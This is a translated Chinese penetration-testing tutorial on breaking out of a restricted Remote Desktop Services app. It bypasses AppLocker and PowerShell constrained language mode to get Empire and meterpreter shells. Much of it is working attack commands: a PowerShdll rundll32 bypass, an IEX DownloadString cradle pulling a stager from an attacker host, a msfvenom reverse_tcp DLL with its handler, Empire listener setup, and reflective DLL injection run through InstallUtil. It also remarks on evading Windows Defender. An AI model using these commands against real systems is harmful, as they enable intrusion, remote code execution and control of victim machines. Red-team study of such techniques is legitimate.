****

**本文将为大家详细介绍如何在只能访问远程桌面服务，且有 AppLocker 保护 PowerShell 处于语言约束模式下获取目标机器 Empire
shell。PowerShell 处于语言约束模式，可以防止大多数PowerShell 技巧的使用。另外，还有 Windows Defender
也是我们必须要面对和解决的问题。**

 **环境要求：**

> RDS服务器放行80端口出站流量。
>
> .Net v3.5（用于PowerShdll中的dll模式）

 **注：**
powershell.exe不是Powershell。它只托管包含PowerShell的程序集并处理I/O.System.Management.Automation.dll

有关更多信息，请参阅文末链接内容。

## 从 RDS notepad 获取 shell

> <https://blog.netspi.com/breaking-out-of-applications-deployed-via-terminal-> services-citrix-and-kiosks/>
>
> <https://www.pentestpartners.com/security-blog/breaking-out-of-citrix-and-> other-restricted-desktop-environments/>

在记事本界面菜单栏依次选择帮助 -> 查看帮助 -> 触发IE浏览器打开

![从远程桌面服务到获取Empire
shell](https://image.3001.net/images/20180928/1538094658_5bad764274218.png!small)

右键单击IE中的任意链接 ->将目标另存为 ->在桌面上另存为lol.ps1

![从远程桌面服务到获取Empire
shell](https://image.3001.net/images/20180928/1538094675_5bad765396302.png!small)

点击IE中的查看下载，按下文件的下拉列表，打开 -> 记事本。只需在文件中写入powershell.exe并再次保存。

现在，我们再次在IE中右键单击 ->“将目标另存为”。转到下拉菜单“保存类型”，然后选择“所有文件”。你已保存的ps1文件将被显示，你可以选择“运行
PowerShell”这会弹出一个PowerShell命令提示符。但当前的PowerShell提示符处于语言约束模式。我们可以通过自动化变量$ExecutionContext.SessionState.LanguageMode进行验证，可以看到结果为ConstrainedLanguage。

![从远程桌面服务到获取Empire
shell](https://image.3001.net/images/20180928/1538094693_5bad76655660f.png!small)

## 绕过 PoSh 约束模式

首先，我们从<https://github.com/p3nt4/PowerShdll>下载PowerShdll。然后使用python -m
SimpleHTTPServer 80在Kali
Web服务器上托管powershdll.dll。接着，在IE中打开<http://10.7.253.10/PowerShdll.dll>。最后，将其保存为
->
PowerShdll.dll（可以保存在任何文件夹下）。C:\Windows\Tasks文件夹是一个绕过Applocker的好地方，因为该目录通常被列为白名单。但导航到文件夹也可能受到限制，因此在某些情况下你可能需要将其保存到C:\Users\Username\Desktop（桌面）。

![从远程桌面服务到获取Empire
shell](https://image.3001.net/images/20180928/1538094763_5bad76ab3dd41.png!small)

我还不确定如何在Applocked环境中检查DLL规则。

现在，我们将PowerShell提示符导航至桌面，并使用rundll32来执行dll。

    
    
    rundll32 .\PowerShdll.dll,main -w

此时，应该会弹出一个新的交互式PowerShell提示符。我们再次通过自动化变量$ExecutionContext.SessionState.LanguageMode进行验证，可以看到现在已经变为了FullLanguage（完整语言模式）。

![从远程桌面服务到获取Empire
shell](https://image.3001.net/images/20180928/1538094783_5bad76bfa2521.png!small)

## 更简单的方法

直到后来我才发现，其实完全可以省去最后两步的操作。只需使用set Base64 false和set Outfile shell生成一个Empire
stager即可。现在从不受限的PowerShell中，下载shell并将其直接执行到内存中。

    
    
    IEX (New-Object Net.WebClient).DownloadString('http://10.7.253.18/shell');

如果你够幸运Defender将不会拦截，并且你将获取到一个Empire shell/agent。

## ![从远程桌面服务到获取Empire
shell](https://image.3001.net/images/20180928/1538094809_5bad76d98cc44.png!small)

## 获取 meterpreter shell

生成一个dll payload：

    
    
    msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp lhost=10.10.14.2 lport=8081 -f dll -o msf.dll

设置msf侦听程序，使用相同的payload，主机和端口。

    
    
    use multi/handler
    set host tun0
    set port 8081
    set payload windows/x64/meterpreter/reverse_tcp
    exploit

使用之前的IE“另存为”技巧下载msf.dll。

![从远程桌面服务到获取Empire
shell](https://image.3001.net/images/20180928/1538094831_5bad76efc9772.png!small)

出于某种原因，Windows
Defender并没有拦截我的payload。可能是因为payload的x64签名尚未被Defender识别为恶意软件，具体我也不是很清楚。

现在，我们使用rundll32来执行dll。之所以使用rundll32，是因为它是一个不会被Applocker阻止的二进制文件。

    
    
    rundll32 .\msf.dll,Control_RunDLL

成功获取到了meterpreter shell。

## ![从远程桌面服务到获取Empire
shell](https://image.3001.net/images/20180928/1538094862_5bad770e1fabf.png!small)

## 没有 powershell.exe 的 Empire

假设您已建立了一个metasploit会话。

在Empire中，创建一个empire listener 和
stager。最重要的是将Base64设置为false，防止stager调用powershell.exe。由于受限的语言模式，将导致powershell.exe无法在此处运行。

    
    
    uselistener http
    set Host 10.7.253.18
    set Port 4444
    execute
    back
    usestager multi/launcher
    set Base64 false
    generate

现在在MSF中：

    
    
    load powershell
    powershell_shell

在交互式shell中复制粘贴empire listener，在Empire中应该会生成一个agent代理。

## ![从远程桌面服务到获取Empire
shell](https://image.3001.net/images/20180928/1538094887_5bad772736372.png!small)![从远程桌面服务到获取Empire
shell](https://image.3001.net/images/20180928/1538094887_5bad772764cc5.png!small)

## 更多高级技术

 **绕过 powershell 约束模式和 applocker**

以下是一篇关于绕过应用白名单和powershell约束模式的文章，大家可以阅读下：

<https://improsec.com/blog/babushka-dolls-or-how-to-bypass-application-whitelisting-and-constrained-powershell>

> 1.使用windows/hta生成一个listener和hta stager。
>
> 2.在visual studio中打开ReflectivePick project。在适当的位置添加hta base64 shell
> stager，并将dll编译为ReflectivePick_x64.dll。
>
> 3.使用以下PS命令将DLL编码为base64，并将结果通过管道传输到一个文本文件中。
    
    
    $Content = Get-Content .\ReflectivePick_x64.dll -Encoding Byte
    $Encoded = [System.Convert]::ToBase64String($Content)
    $Encoded | Out-File "C:\Windows\Tasks\dll.txt"

> 4.复制粘贴dll.txt的内容到Invoke-ReflectivePEInjection.ps1的新变量中。
    
    
    $dllData = "DLLBASE64_GOES_HERE"
    $ProcId = (Get-Process explorer).Id
    $Bytes = [System.Convert]::FromBase64String($dllData)
    Invoke-ReflectivePEInjection -PEBytes $Bytes -ProcId $ProcId

> 5.使用<https://www.base64encode.org/>在线Base64编码整个脚本。打开VS中的Bypass
> project，并将编码后的内容复制粘贴到encoded变量中。使用VS将其编译为Bypass.exe。
>
> 6.使用installutil.exe执行bypass.exe
    
    
    set-location \\tsclient\lkylabs
    copy-item .\Bypass.exe c:\windows\tasks
    cd c:\windows\tasks
    C:\windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\Bypass.exe

## 参考链接

> <https://github.com/Ben0xA/AwesomerShell>
>
> <https://www.youtube.com/watch?v=czJrXiLs0wM>
>
> <https://adsecurity.org/?p=2921>
>
> <https://bneg.io/2017/07/26/empire-without-powershell-exe/>
>
> <https://artofpwn.com/offensive-and-defensive-powershell-ii.html>
>
> <https://improsec.com/blog/babushka-dolls-or-how-to-bypass-application-> whitelisting-and-constrained-powershell>
>
> <https://github.com/caseysmithrc/DeviceGuardBypasses>
>
> <https://github.com/Joshua1909/AllTheThings>
>
> <https://disman.tl/2015/01/30/an-improved-reflective-dll-injection-> technique.html>
>
> <https://twitter.com/gentilkiwi/status/976939139248640000>

 ** *参考来源：[chryzsh](https://chryzsh.gitbooks.io/darthsidious/content/defense-evasion/from-rds-app-to-empire-shell.html)，FB小编 secist 编译，转载请注明来自FreeBuf.COM**

